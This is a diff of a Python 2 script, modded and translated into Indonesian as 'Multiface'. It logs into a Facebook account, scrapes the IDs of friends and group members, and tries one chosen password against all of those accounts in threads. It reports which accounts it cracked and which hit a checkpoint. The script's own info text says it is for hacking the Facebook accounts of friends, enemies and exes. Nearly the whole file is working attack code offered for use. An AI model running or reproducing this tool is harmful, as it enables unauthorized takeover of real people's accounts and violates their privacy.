@@ -1,10 +1,40 @@
-#!/data/data/com.termux/files/usr/bin/python
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
-# Pesbukmbf
-# Coded by Senja
-# Github: https://github.com/stepbystepexe/Pesbukmbf
+# Multiface
+# Mod by Nedi Senja
+# Github: https://github.com/stepbystepexe/Multiface
+
 import platform, os, sys, cookielib, re, urllib2, urllib, threading, time, random
-from mechanize import Browser as browser
+from mechanize import Browser
+
+info = """
+Nama        : Multiface
+Versi       : 4.2 (Update: 06 Mei 2020, 12:00 AM)
+Tanggal     : 25 November 2019
+Mod         : Nedi Senja
+Tujuan      : Brefungsi untuk hek pesbuk
+              teman, musuh & mantan
+Terimakasih : Allah SWT.
+              FR13NDS, & seluruh
+              manusia seplanet bumi
+NB          : Manusia gax ada yang sempurna
+              sama kaya yang mod tool ini.
+              Silahkan laporkan kritik atau saran
+              Ke - Email: d_q16x@outlook.co.id
+                 - WhatsApp: +62 8577-5433-901
+
+[ \033[4mGunakan tool ini dengan bijak \033[0m]\n """
+
+example = """\033[0;103;1;90m[          Multiface, My Github: @stepbystepexe          ]\033[0m"""
+
+logo = """
+     \x1b[0;41;31m[ ]\x1b[0m~\x1b[0;42;32m[ ]\x1b[0m~\x1b[0;44;34m[ ]\x1b[0m        \x1b[0;40;37m[-]\x1b[0m
+          |              |
+\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[0;90;43;1m Multi \x1b[0;97;45;1m Brute \033[0;77;104;1m Facebook  \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m
+                  \x1b[1;77m/\x1b[0m
+     \x1b[0;90;47;1m * \x1b[0;77;44;1m Mod by \x1b[0;1;101m # Nedi Senja \x1b[0m
+"""
+
 def printf(x,e=0):
         f = 'mhkbpcP'
         for o in f:
@@ -17,12 +47,13 @@ def printf(x,e=0):
         else:
                 sys.stdout.write(x+'\n')
 if platform.python_version().split('.')[0] != '2':
-        printf('[!] You are using a python version %s please use the version 2.x.x'%v().split(' ')[0])
+        printf('[!] Kamu menggunakan Python versi %s mohon gunakan Python versi 2.x.x'%v().split(' ')[0])
         sys.exit(1)
 try:
+
   import mechanize
 except ImportError:
-        printf('[!] It looks like the Mechanize module hasn\'t been installed yet\n[!] pip2 install mechanize')
+        printf('[!] Sepertinya modul Mechanize belum terinstall,\n[!] pip2 install mechanize')
         sys.exit(1)
 br = 0
 log = 0
@@ -30,6 +61,7 @@ id_bfriend = []
 id_bgroups = []
 fid_bfriend = []
 fid_bgroups = []
+
 class pesbuk(threading.Thread):
         def __init__(self,x,f):
                 threading.Thread.__init__(self)
@@ -53,20 +85,22 @@ class pesbuk(threading.Thread):
                 else:
                         self.o = 3
 def loads():
-    tix = [
+    x = [
      '.   ', '..  ', '... ']
-    for o in tix:
+    for o in x:
         print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading ' + o,
         sys.stdout.flush()
         time.sleep(1)
+
 def crack(o):
         while 1:
-                x = input_one('\n\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mPassword')
+                x = input_one('\n\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mSandi')
                 if len(x) < 6:
-                        print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mEnter minimal 6 letters')
+                        print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mMasukan Minimal 6 Huruf')
                 else:
                         break
         return crack_pb(o,x)
+
 def display(account,passw,data):
         checkpoint = []
         false = 0
@@ -79,24 +113,25 @@ def display(account,passw,data):
                         checkpoint.append(id)
                 elif o == 3:
                         wrongs += 1
-        print('\x1b[0m[\x1b[92;1m+\x1b[0m] Working \x1b[77;1m%d \x1b[0m'%len(works))
+        print('\x1b[0m[\x1b[92;1m+\x1b[0m] Berhasil \x1b[77;1m%d \x1b[0m'%len(works))
         if len(works) != 0:
                 for x in works:
                         print('\n\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1m%s => \x1b[0m[%s]'%(x,passw))
-        print('\x1b[0m[\x1b[93;1m*\x1b[0m] Checkpoint \x1b[77;1m%d \x1b[0m'%len(checkpoint))
+        print('\x1b[0m[\x1b[93;1m*\x1b[0m] Cekpoint \x1b[77;1m%d \x1b[0m'%len(checkpoint))
         if len(checkpoint) != 0:
                 for x in checkpoint:
                         print('\n\x1b[0m[\x1b[93;1m#\x1b[0m] \x1b[77;1m%s => \x1b[0m[%s]'%(x,passw))
-        print('\x1b[0m[\x1b[91;1m-\x1b[0m] \x1b[77;1mFailed    \x1b[0m'+str(false))
-        x = input_one('\n\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mNot satisfied with your results, want to try again [Y/n]',['Y','N'])
+        print('\x1b[0m[\x1b[91;1m-\x1b[0m] \x1b[77;1mGagal    \x1b[0m'+str(false))
+        x = input_one('\n\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mMulai ulang lagi [Y/n]',['Y','N'])
         if x.upper() == 'Y':
                 return crack(data)
         else:
                 return menu()
+
 def crack_pb(data,passw):
         account = []
-        print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCrack \x1b[0m%d \x1b[77;1mAccount with a Password \x1b[0m[%s]'%(len(data),passw))
-        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mCracking  \x1b[0m%',1)
+        print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mMengcrack \x1b[0m%d \x1b[77;1mAkun dengan sandi \x1b[0m[%s]'%(len(data),passw))
+        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mCracking ...\x1b[0m%',1)
         sys.stdout.flush()
         count0,count1 = 0,0
         f = []
@@ -116,7 +151,7 @@ def crack_pb(data,passw):
                         for o in f:
                                 status,id = o.update()
                                 if status != 0:
-                                        print('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCracking  \x1b[0m%d %s '%(int(float((float(count0)/float(count1))*100)),'%'),1)
+                                        print('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCracking ... \x1b[0m%d %s '%(int(float((float(count0)/float(count1))*100)),'%'),1)
                                         sys.stdout.flush()
                                         del(f[f.index(o)])
                                         if status == 4:
@@ -136,8 +171,9 @@ def crack_pb(data,passw):
                         if threading.activeCount() == 1:break
                 except KeyboardInterrupt:
                         exit()
-        print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCracking  100%      ')
+        print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCracking ... 100%      ')
         display(account,passw,data)
+
 def browser():
         global br
         reload(sys)
@@ -150,6 +186,7 @@ def browser():
         br.set_handle_redirect(True)
         br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
         br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+
 def datacount():
         global fid_bgroups,fid_bfriend
         try:
@@ -158,93 +195,101 @@ def datacount():
         try:
                 fid_bfriend = open(os.sys.path[0]+'/MBFfriend.txt','r').readlines()
         except:pass
+
 def saved():
         if len(id_bgroups) != 0:
-                print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSaving results from group')
+                print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSimpan daftar Grup')
                 try:
                         open(os.sys.path[0]+'/MBFgroups.txt','w').write('\n'.join(id_bgroups))
-                        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSaved successfully MBFgroups.txt')
+                        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mMenyimpan berhasil MBFgroups.txt')
                 except:
-                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mSaving failed')
+                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMenyimpan gagal')
         if len(id_bfriend) != 0:
-                print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSave friend list results')
+                print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSimpan daftar Teman')
                 try:
                         open(os.sys.path[0]+'/MBFfriend.txt','w').write('\n'.join(id_bfriend))
-                        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSaved successfilly MBFfriend.txt')
+                        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mMenyimpan berhasil MBFfriend.txt')
                 except:
-                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1Saving failed')
+                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1Menyimpan gagal')
+
 def exit():
         saved()
-        print('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mExit the program!\n')
+        print('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKeluar dari program!\n')
         sys.exit(1)
+
 def input_one(o,f=0):
         while 1:
                 try:
                         x = raw_input('\x1b[0m%s: \x1b[77;1m'%o)
                 except:
-                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mFailed')
+                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGagal')
                         exit()
                 if f:
                         if x.upper() in f:
                                 break
                         else:
-                                print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mEnter the options')
+                                print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mTekan Enter opsi')
                                 continue
                 else:
                         if len(x) == 0:
-                                print('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mEnter correctly')
+                                print('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mTidak boleh kosong')
                                 continue
                         else:
                                 break
         return x
+
 def input_two(i,x):
         while 1:
                 try:
                         o = int(input_one(i))
                 except:
-                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mWrong choice')
+                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan salah')
                         continue
                 if o in x:
                         break
                 else:
-                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mWrong choice')
+                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan salah')
         return o
+
 def next_one():
         global fid_bgroups
         if len(fid_bgroups) != 0:
-                x = input_one('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mResearch group id results/continue \x1b[0m[R/L]',['R','L'])
+                x = input_one('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mResetar daftar Grup anda \x1b[0m[R/L]',['R','L'])
                 if x.upper() == 'L':
                         return crack(fid_bgroups)
                 else:
                         os.remove(os.sys.path[0]+'/MBFgroups.txt')
                         fid_bgroups = []
         return 0
+
 def next_two():
         global fid_bfriend
         if len(fid_bfriend) != 0:
-                x = input_one('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mResearch the results of your id friend/continue [R/L]',['R','L'])
+                x = input_one('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mRestar daftar Teman anda [R/L]',['R','L'])
                 if x.upper() == 'L':
                         return crack(fid_bfriend)
                 else:
                         os.remove(os.sys.path[0]+'/MBFtriend.txt')
                         fid_bfriend = []
         return 0
+
 def open_pb(o):
         try:
                 x = br.open(o)
                 br._factory.is_html = True
                 x = x.read()
         except:
-                print('\n\x1b[0m[\x1b[95;1mx\x1b[0m] \x1b[77;1mOpen failed \x1b[0m' +str(o))
+                print('\n\x1b[0m[\x1b[95;1mx\x1b[0m] \x1b[77;1mGagal Membuka \x1b[0m' +str(o))
                 exit()
         if '<link rel="redirect" href="' in x:
                 return open_pb(br.find_link().url)
         else:
                 return x
+
 def login():
         global log
-        username = input_one('\x1b[0m[\x1b[92;1m+\x1b[0m] Username')
-        password = input_one('\x1b[0m[\x1b[93;1m*\x1b[0m] Password')
+        username = input_one('\x1b[0m[\x1b[92;1m+\x1b[0m] Email')
+        password = input_one('\x1b[0m[\x1b[93;1m*\x1b[0m] Sandi')
         loads()
         open_pb('https://m.facebook.com')
         br.select_form(nr=0)
@@ -257,17 +302,18 @@ def login():
                 name = br.find_link(url_regex='logout.php').text
                 name = re.findall(r'\((.*a?)\)',name)[0]
                 os.system('xdg-open https://github.com/thedarksec/')
-                print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mWelecome %s'%name)
-                print('\x1b[0m[\x1b[96;1m*\x1b[0m] \x1b[77;1mHopefully this is a lucky day your')
+                print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSelamat datang %s'%name)
+                print('\x1b[0m[\x1b[96;1m*\x1b[0m] \x1b[77;1mSemoga hari ini anda beruntung')
                 log = 1
         elif 'checkpoint' in url:
-                print('\n\x1b[0m[\x1b[95;1m#\x1b[0m] \x1b[77;1mAccount Has Banned Checkpoint\n\x1b[0m[\x1b[96;1m$\x1b[0m] \x1b[77;1mTry login in with Opera Mini')
+                print('\n\x1b[0m[\x1b[95;1m#\x1b[0m] \x1b[77;1mAkun kena Cekpoint\n\x1b[0m[\x1b[96;1m$\x1b[0m] \x1b[77;1mCoba masuk menggunakan Opera Mini')
                 exit()
         else:
-                print('\x1b[0m[\x1b[95;1mx\x1b[0m] \x1b[77;1mLogin failed')
+                print('\x1b[0m[\x1b[95;1mx\x1b[0m] \x1b[77;1mMasuk Gagal')
+
 def idgroups():
         if log != 1:
-                print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mLogin Account Pesbuk \x1b[0m[\x1b[91;1m/\x1b[0m]')
+                print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mMasuk Akun Facebook Anda \x1b[0m[\x1b[91;1m/\x1b[0m]')
                 login()
                 if log == 0:
                         exit()
@@ -277,59 +323,59 @@ def idgroups():
                 try:
                         next = br.find_link(url_regex='/browse/group/members/').url
                 except:
-                        print('\n\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mCan only take \x1b[0m%d id'%len(id_bgroups))
+                        print('\n\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mJumalh ID Grup sekarang \x1b[0m%d id'%len(id_bgroups))
                         break
         saved()
-        x = input_two('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mCrack right away \x1b[0m[Y/n]',['Y','N'])
+        x = input_two('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mMulai mengcrack sekarang \x1b[0m[Y/n]',['Y','N'])
         if x.upper() == 'Y':
                 return crack(id_bgroups)
         else:
                 return menu()
+
 def cracks_id_friend(r):
         for o in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
                 id_bfriend.append(o)
+
 def idfriend():
         if log != 1:
-                print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mLogin Account Pesbuk \x1b[0m[\x1b[91;1m/\x1b[0m]')
+                print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mMasuk Akun Facebook Anda \x1b[0m[\x1b[91;1m/\x1b[0m]')
                 login()
                 if log == 0:
                         exit()
-        print('\n\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCollecting friend id')
+        print('\n\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mMengumpulkan ID Teman')
         open_pb('https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
         counts = br.find_link(url_regex='/friends/center/friends/').text
         counts = re.findall(r'\((.*a?)\)',counts)[0]
-        print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mTake \x1b[0m%s \x1b[77;1mid friend \x1b[0m'%counts)
+        print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mJumalah \x1b[0m%s \x1b[77;1mID Teman \x1b[0m'%counts)
         cracks_id_friend(open_pb('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
         try:
                 next = br.find_link(url_regex='friends_center_main').url
         except:
                 if len(id_friend) != 0:
-                        print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mCan only take \x1b[0m%d id'%len(id_friend))
+                        print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mJumlah ID Teman Sekarang \x1b[0m%d id'%len(id_friend))
                 else:
-                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCanceled')
+                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKembali')
                         exit()
         while 1:
                 cracks_id_friend(open_pb(next))
-                print('\n\x1b[0m[\x1b[96;1m+\x1b[0m] m%s \x1b[77;1mWas taken id \x1b[0m'%len(id_bfriend),1)
+                print('\n\x1b[0m[\x1b[96;1m+\x1b[0m] m%s \x1b[77;1mJumlah semua ID \x1b[0m'%len(id_bfriend),1)
                 sys.stdout.flush()
                 try:
                         next = br.find_link(url_regex='friends_center_main').url
                 except:
-                        print('\n\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCan only take \x1b[0m%d id'%len(id_bfriend))
+                        print('\n\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mJumlah ID Teaman sekarang \x1b[0m%d id'%len(id_bfriend))
                         break
         saved()
-        x = input_two('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mCrack right away \x1b[0m[Y/n]',['Y','N'])
+        x = input_two('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mMulai mengcrack sekarang \x1b[0m[Y/n]',['Y','N'])
         if x.upper() == 'Y':
                 return crack(id_bfriend)
         else:
                 return menu()
 def menu():
-        os.system('clear')
-        os.system('reset')
-        time.sleep(1)
-        print('\n\n     \x1b[0;41;31m[ ]\x1b[0m~\x1b[0;42;32m[ ]\x1b[0m~\x1b[0;44;34m[ ]\x1b[0m        \x1b[0;40;37m[-]\x1b[0m\n          |              |\n\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[0;90;46;1m Hek \x1b[0;97;45;1m Pesbuk \033[0;90;43;1m   MBF   \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m\n              \x1b[1;77m/\x1b[0m\n     \x1b[0;90;47;1m * \x1b[0;1;77;104m Coded by \x1b[0;1;77;101m # Senja \x1b[0m\n\n')
-        print('\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mPesbuk Multi Brute Forcers \x1b[0m[\x1b[91;1m/\x1b[0m]\n\x1b[0m[\x1b[94;1m1\x1b[0m] Crack From Friend\n\x1b[0m[\x1b[93;1m2\x1b[0m] Crack From Groups\n\x1b[0m[\x1b[92;1m3\x1b[0m] Exit\n')
-        x = input_two('\x1b[0m[\x1b[91;1m-\x1b[0m] \x1b[77;1mSelect an option\x1b[0m',[1,2,3])
+        print("\n\n\033[0m[\033[94;1m1\033[0m] Crack dari Grup")
+        print("\033[0m[\033[92;1m2\033[0m] Crack dari Teman")
+        print("\033[0m[\033[91;1m3\033[0m] Keluar")
+        x = input_two('\n\x1b[0m[\x1b[93;1m-\x1b[0m] \x1b[77;1mMasukan Opsi\x1b[0m',[1,2,3])
         if x == 2:
                 next_one()
                 idgroups()
@@ -337,7 +383,61 @@ def menu():
                 next_two()
                 idfriend()
         elif x == 3:
-                exit()
+                print ("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!\n")
+                time.sleep(1)
+                sys.exit(1)
+
+def restart():
+    python = sys.executable
+    os.execl(python, python, * sys.argv)
+    curdir = os.getcwd()
+
+os.system('clear')
+os.system('reset')
+time.sleep(1)
+print
+print(logo)
+print
+print("\033[0m[\033[1;96mあ\033[0m] \033[1;77mMulai Menggunakan Multiface")
+print
+print("\033[0m[\033[93;1m&\033[0m] LISENSI")
+print("\033[0m[\033[94;1m#\033[0m] Informasi")
+print("\033[0m[\033[92;1m*\033[0m] Perbarui")
+print("\033[0m[\033[91;1m-\033[0m] Keluar")
+print
+option = raw_input("\033[0m[\033[1;95m/\033[0m] \033[1;77mMasukan opsi: \033[0m")
+if option.strip() in 'あ 1 gunakan'.split():
+    menu()
+elif option.strip() in '& 2 lisensi'.split():
+    print
+    os.system('nano LICENSE')
+    print
+    restart()
+elif option.strip() in '# 3 info'.split():
+    os.system('clear')
+    print(example)
+    os.system('toilet -f smslant Multi')
+    print(info)
+    time.sleep(1)
+    print
+    raw_input('[ Tekan Enter ]')
+    restart()
+elif option.strip() in '* 4 perbarui'.split():
+    print
+    os.system('git pull origin master')
+    print
+    raw_input('\033[0m[ \033[92mTekan Enter \033[0m]')
+    restart()
+elif option.strip() in '- keluar 0'.split():
+    print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
+    print
+    sys.exit(1)
+else:
+    print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
+    print
+    time.sleep(1)
+    restart()
+
 datacount()
 browser()
 menu()
